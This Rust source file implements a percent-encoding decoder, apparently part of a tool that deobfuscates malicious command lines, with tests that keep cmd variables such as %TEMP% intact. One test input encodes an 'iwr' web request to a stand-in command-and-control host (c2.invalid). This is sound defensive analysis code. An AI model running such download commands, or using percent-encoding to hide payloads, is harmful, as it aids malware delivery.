use super::Decoder;
use crate::util::re;
use percent_encoding::percent_decode_str;
use regex::Regex;
use std::sync::LazyLock;

/// Percent encoding (`[uri]::UnescapeDataString('%69%65%78')`, encoded `mshta` URLs).
///
/// Decodes runs of `%XX` only when the input holds at least 3 escapes in total and the
/// run decodes to printable ASCII. This keeps cmd variables like `%CD%` / `%TEMP%` intact
/// (`%TE` is not hex; a lone `%CD` is below the count and decodes to a non-ASCII byte).
pub struct PercentDecoder;

static RUN: LazyLock<Regex> = LazyLock::new(|| re(r"(?:%[0-9a-f]{2})+"));
static ANY: LazyLock<Regex> = LazyLock::new(|| re(r"%[0-9a-f]{2}"));

impl Decoder for PercentDecoder {
    fn name(&self) -> &'static str {
        "percent"
    }
    fn try_decode(&self, input: &str) -> Option<String> {
        if ANY.find_iter(input).take(3).count() < 3 {
            return None;
        }
        let mut changed = false;
        let out = RUN.replace_all(input, |c: &regex::Captures| {
            let bytes: Vec<u8> = percent_decode_str(&c[0]).collect();
            if !bytes.is_empty()
                && bytes
                    .iter()
                    .all(|b| (0x20..0x7f).contains(b) || *b == b'\n')
            {
                changed = true;
                String::from_utf8_lossy(&bytes).into_owned()
            } else {
                c[0].to_string()
            }
        });
        changed.then(|| out.into_owned())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn decodes_runs() {
        assert_eq!(
            PercentDecoder
                .try_decode("UnescapeDataString('%69%77%72 https%3A%2F%2Fc2.invalid')")
                .unwrap(),
            "UnescapeDataString('iwr https://c2.invalid')"
        );
    }
    #[test]
    fn keeps_cmd_vars() {
        assert!(PercentDecoder
            .try_decode(r"cd %CD% && copy %TEMP%\a %APPDATA%\b")
            .is_none());
    }
}
